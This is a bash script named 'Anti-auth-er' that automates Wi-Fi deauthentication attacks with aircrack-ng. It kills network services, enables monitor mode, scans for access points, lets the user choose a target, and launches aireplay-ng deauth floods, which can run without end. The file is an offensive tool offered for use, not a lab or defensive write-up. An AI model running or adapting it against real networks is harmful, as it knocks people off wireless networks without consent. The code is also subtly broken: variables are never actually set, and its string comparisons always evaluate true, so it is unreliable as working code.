#!/usr/bin/env bash

function ref___() {
    clear
    ~/claps/Anti-auth-er/ops/aar-logo
    echo ""
    echo ""
}

function aar-reset() { #fixed
    sudo clear #just to look good

    iwconfig | tee ~/claps/Anti-auth-er/logs/.interface-mon.log &> ~/claps/Anti-auth-er/logs/interface-mon.log
    read $junk < ~/claps/Anti-auth-er/logs/interface-mon.log
    echo "$junk" | awk '{interface=$1;}'
    rm -rf ~/claps/Anti-auth-er/logs/.interface-mon.log

    sudo airmon-ng stop $interface &>> ~/claps/Anti-auth-er/logs/reset.log
    sudo service NetworkManager restart
    sudo service wpa_supplicant restart
}

function aar-reatt() {
    sudo clear
    
    ref___
    echo "Resolving interface ..."
    iwconfig | tee ~/claps/Anti-auth-er/logs/.interface.log &> ~/claps/Anti-auth-er/logs/interface.log
    read $junk < ~/claps/Anti-auth-er/logs/interface.log
    echo "$junk" | awk '{interface=$1;}'
    rm -rf ~/claps/Anti-auth-er/logs/.interface.log
    sleep 2
    ref___
    echo "killing Netwrk ..."
    sudo airmon-ng check kill &> ~/claps/Anti-auth-er/logs/.aar.rep.log
    echo "~~~~" >> ~/claps/Anti-auth-er/logs/.aar.rep.log
    sleep 1.5
    ref___
    echo "Activating monitor mode over $interface ..."
    sudo airmon-ng start $interface &>> ~/claps/Anti-auth-er/logs/.aar.rep
    echo "~~~~" >> ~/claps/Anti-auth-er/logs/.aar.rep.log
    sleep 1.5

    ref___
    echo "Checking ..."
    iwconfig | tee ~/claps/Anti-auth-er/logs/.interface-mon.log &> ~/claps/Anti-auth-er/logs/interface-mon.log
    echo "~~~~" >> ~/claps/Anti-auth-er/logs/.aar.rep.log
    read $junk < ~/claps/Anti-auth-er/logs/interface-mon.log
    echo "$junk" | awk '{interface_mon=$1;}'
    rm -rf ~/claps/Anti-auth-er/logs/.interface-mon.log
    
    if [ "$interface"=="$interface_mon" ]; then
        ref___
        echo "interface rename not triggered by airmon-ng."
        echo "interface: $interface"
    else
        ref___
        echo "resolved new interface name: $interface_mon"
    fi

    ref___
    echo -n "de-auths(infinite: 0): "
    read death

    ref___
    echo "launching Anti-auth ..."
    read bssid < ~/claps/Anti-auth-er/scan/bssid
    #read channel < ~/claps/Anti-auth-er/scan/channel
    xterm -T "Anti-auth-er" -e "aireplay-ng -0 $death -a $bssid"

    clear
    echo "resetting Netwrk ..."
    aar-reset
}


function aar() {
    sudo clear #just to look good

    # echo "error rep `date`" >> ~/.aar.rep
    # echo "~" >> ~/.aar.rep
    # arg1="-h"
    # arg11="--help"
    
    # if [ "$1"=="$arg1" ] || [ "$1"=="$arg11" ]; then
    #     ref___
    #     echo "help"
    #     echo "aar <options> <args ...>"
    #     echo ""
    #     echo "options:"
    #     echo "-h --help => help"
    #     echo "rep => show error report"
    #     echo ""
    #     echo "args1: <wifi-interface-name>"
    #     echo ""
    #     return 0
    # fi

    ##### add a feature so that it checks if interface and interface-mon logs exists 

    if [ -d "~/claps/Anti-auth-er/scan" ]; then
        rm -rf ~/claps/Anti-auth-er/scan
    fi



    ref___
    echo 'Resolving interface ...'
    iwconfig | tee ~/claps/Anti-auth-er/logs/.interface.log &> ~/claps/Anti-auth-er/logs/interface.log
    read $junk < ~/claps/Anti-auth-er/logs/interface.log
    echo $junk | awk '{interface=$1;}'
    rm -rf ~/claps/Anti-auth-er/logs/.interface.log
    sleep 2
    echo 'killing Netwrk ...'
    sudo airmon-ng check kill &> ~/claps/Anti-auth-er/logs/.aar.rep.log
    echo '~~~~' >> ~/claps/Anti-auth-er/logs/.aar.rep.log
    sleep 1.5
    echo 'Activating monitor mode over $interface ...'
    sudo airmon-ng start $interface &>> ~/claps/Anti-auth-er/logs/.aar.rep
    echo '~~~~' >> ~/claps/Anti-auth-er/logs/.aar.rep.log
    sleep 1.5

    ref___
    echo 'Checking ...'
    iwconfig | tee ~/claps/Anti-auth-er/logs/.interface-mon.log &> ~/claps/Anti-auth-er/logs/interface-mon.log
    read $junk < ~/claps/Anti-auth-er/logs/interface-mon.log
    echo $junk | awk '{interface_mon=$1;}'
    rm -rf ~/claps/Anti-auth-er/logs/.interface-mon.log
    
    if [ "$interface"==$interface_mon ]; then
        ref___
        echo "interface rename not triggered by airmon-ng."
        echo "interface: $interface"
    else
        ref___
        echo "resolved new interface name: $interface_mon"
    fi

    echo ""
    echo "Anti-auth-er will launch ssid search. close the new terminal in 5 seconds after the target appears"
    echo -n "press [enter/return] when ready ..."
    read choke
    mkdir ~/claps/Anti-auth-er/dump
    xterm -T "Anti-auth-er ~ Scanner" -e "airodump-ng -w ~/claps/Anti-auth-er/dump/scan $interface_mon"
    
    ref___
    echo "parsing ..."
    ~/claps/Anti-auth-er/ops/scan-parse
    rm -rf ~/claps/Anti-auth-er/dump
    sleep 1

    clear
    echo "Choose from the following ..."
    echo ""
    ~/claps/Anti-auth-er/ops/scan-show
    echo ""
    echo -n "index: "
    read index
    
    ref___
    echo "resolving target ..."
    ~/claps/Anti-auth-er/ops/export-target $index
    echo ""
    echo -n "de-auths(infinite: 0): "
    read death
    
    ref___
    echo "launching Anti-auth ..."
    read bssid < ~/claps/Anti-auth-er/scan/bssid
    #read channel < ~/claps/Anti-auth-er/scan/channel
    xterm -T "Anti-auth-er" -e "aireplay-ng -0 $death -a $bssid"

    ref___
    echo "press q to quit"
    echo "press r to restart"
    echo "press e to re-attack"
    echo ""
    echo ": "
    read ch
    a="q"
    b="r"
    c="e"
    A="Q"
    B="R"
    C="E"
    if [ "$ch"=="$a" ] || [ "$ch"=="$A" ]; then 
        clear
        echo "resetting Netwrk ..."
        aar-reset
        return 0
    fi

    if [ "$ch"=="$b" ] || [ "$ch"=="$B" ]; then
        aar
    fi

    if [ "$ch"=="$c" ] || [ "$ch"=="$C" ]; then
        aar-reatt
    fi

}